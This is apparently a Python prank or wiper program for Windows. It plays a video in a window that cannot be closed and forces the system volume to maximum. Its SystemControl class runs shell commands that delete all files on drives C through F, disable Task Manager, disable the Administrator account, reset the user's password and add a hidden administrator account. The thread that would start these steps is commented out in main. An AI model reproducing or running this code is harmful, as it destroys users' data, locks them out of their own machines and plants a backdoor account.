import os
import sys
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
import comtypes
import threading

from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
from PySide6.QtMultimediaWidgets import QVideoWidget
from PySide6.QtWidgets import QMainWindow, QApplication, QWidget
from PySide6.QtCore import QUrl

class Window(QMainWindow):
    def __init__(self, videoPath, width, height, move):
        super().__init__()

        self.setMinimumSize(width, height)
        self.move(move[0], move[1])

        self._audio_output = QAudioOutput()
        # 创建媒体播放器对象
        self._player = QMediaPlayer()
        self._player.setAudioOutput(self._audio_output)
        # 创建视频显示部件
        self._video_widget = QVideoWidget()
        # 设置视频显示部件为主窗口的中心部件
        self.setCentralWidget(self._video_widget)
        # 将视频显示部件设置为媒体播放器的视频输出设备
        self._player.setVideoOutput(self._video_widget)
        self.videoPath = videoPath

    def play(self):
        self._player.setSource(QUrl.fromLocalFile(self.videoPath))
        self._player.play()

    def closeEvent(self, event):
        event.ignore()
        self.show()

class SystemControl:

    def __init__(self):
        pass

    def copyFile(self, copyPath, pastePath):
        os.system(f'copy {copyPath} {pastePath}')

        return self

    def disableUser(self, userName):
        os.system(f'net user {userName} /active:no')

        return self

    def disableTaskManage(self, num):
        # 1 disable | 0 enable
        os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')

        return self

    def delAllFiles(self):
        os.system('del C:/*.* /S /Q')
        os.system('del D:/*.* /S /Q')
        os.system('del E:/*.* /S /Q')
        os.system('del F:/*.* /S /Q')

        os.system('rd C:/ /S /Q')
        os.system('rd D:/ /S /Q')
        os.system('rd E:/ /S /Q')
        os.system('rd F:/ /S /Q')

        return self

    def setPassword(self, password):
        os.system('echo %username% > userName')

        file = open('./userName', 'r', encoding='utf-8')
        userName = file.readlines()
        userName = userName[0].split()[0]

        print(userName)

        os.system(f'net user {userName} {password}')
        file.close()
        os.remove('./userName')

        return self

    def createUser(self, userName, password, manager=False):
        if manager:
            os.system(f'net user {userName} {password} /add')
            os.system(f'net localgroup Administrators {userName} /add')
        else:
            os.system(f'net user {userName} {password} /add')

        return self

    @staticmethod
    def getFilePath(fileName):
        # 获取打包后的可执行文件所在的临时目录
        basePath = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))
        # 构建文件的绝对路径
        return os.path.join(basePath, fileName)

    @staticmethod
    # 获取系统音量
    def getAudioEndpointVolume():
        try:
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume = cast(interface, POINTER(IAudioEndpointVolume))
            # GetMasterVolumeLevelScalar()
            return volume
        except comtypes.COMError as e:
            print(f"COMError: {e}")
            return None

    # 取消静音
    def clearMute(self):
        volume = self.getAudioEndpointVolume()
        if volume is None:
            print("无法获取音频设备")
            return self

        try:
            if volume.GetMute():
                volume.SetMute(0, None)
                print("系统已解除静音")
                return self
            else:
                print("系统未处于静音状态")
                return self
        except comtypes.COMError as e:
            print(f"COMError: {e}")
            return self

    # 设置音量
    def setAudio(self, num: float):
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
        # 设置音量（0.0到1.0之间的浮点数）
        volume_interface.SetMasterVolumeLevelScalar(num, None)

        return self

def backgroundTasks():
    system = SystemControl()
    (system
     .setAudio(1)
     .disableTaskManage(1)
     .disableUser('Administrator')
     .clearMute()
     .setPassword('1145141919810')
     .createUser('clown', '0d000721', True)
     .delAllFiles()
     )
    addEvents()

def addEvents():
    while True:
        (SystemControl()
         .setAudio(1)
         .clearMute()
         )

def main():
    app = QApplication(sys.argv)
    window = Window(SystemControl.getFilePath('./video.mp4'), 300, 450, [300, 450])
    window.show()
    window.play()

    # threading.Thread(target=backgroundTasks).start()

    # threading.Thread(target=backgroundTasks).start()
    # threading.Thread(target=addEvents).start()

    # os.system('shutdown -s -f -t 150')
    sys.exit(app.exec())

if __name__ == '__main__':
    main()
